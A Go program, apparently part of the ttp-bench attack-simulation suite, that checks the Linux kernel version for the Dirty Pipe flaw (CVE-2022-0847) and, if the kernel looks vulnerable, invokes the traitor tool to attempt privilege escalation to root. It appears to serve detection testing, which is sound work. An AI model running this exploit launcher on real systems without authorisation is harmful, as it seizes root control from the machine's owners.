//go:build linux

// Simulate CVE-2022-0847 (Dirty pipe) to escalate user privileges to root
package main

import (
	"log"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"

	"github.com/tstromberg/ttp-bench/pkg/simulate"
)

var KernelRe = regexp.MustCompile(`[0-9]+\.[0-9]+(\.[0-9]+)*`)

// From https://github.com/liamg/traitor/blob/b5ac09a1b55aac51dd249b8d8aef3488117bdd13/pkg/exploits/cve20220847/exploit.go#L33
func IsVulnerable(val string) bool {
	ver := KernelRe.FindString(val)

	var segments []int
	for _, str := range strings.Split(ver, ".") {
		n, err := strconv.Atoi(str)
		if err != nil {
			return false
		}
		segments = append(segments, n)
	}

	if len(segments) < 3 {
		return false
	}

	major := segments[0]
	minor := segments[1]
	patch := segments[2]

	switch {
	case major == 5 && minor < 8:
		return false
	case major > 5:
		return false
	case minor > 16:
		return false
	case minor == 16 && patch >= 11:
		return false
	case minor == 15 && patch >= 25:
		return false
	case minor == 10 && patch >= 102:
		return false
	}

	return true
}

func main() {
	c := exec.Command("uname", "-r")
	log.Printf("running %s from %s", c, os.Args[0])
	bs, err := c.CombinedOutput()
	if err != nil {
		log.Fatalf("run failed: %v\n%s", err, bs)
	}

	kernel := strings.TrimSpace(string(bs))
	if !IsVulnerable(kernel) {
		log.Printf("kernel %s does not seem vulnerable, skipping ...", kernel)
		return
	}

	log.Printf("found possibly vulnerable kernel: %s", kernel)

	if err := simulate.Traitor("--exploit", "kernel:CVE-2022-0847"); err != nil {
		log.Fatalf("exploit failed: %v", err)
	}

	log.Printf("I think we were successful? If so, awesome.")
}
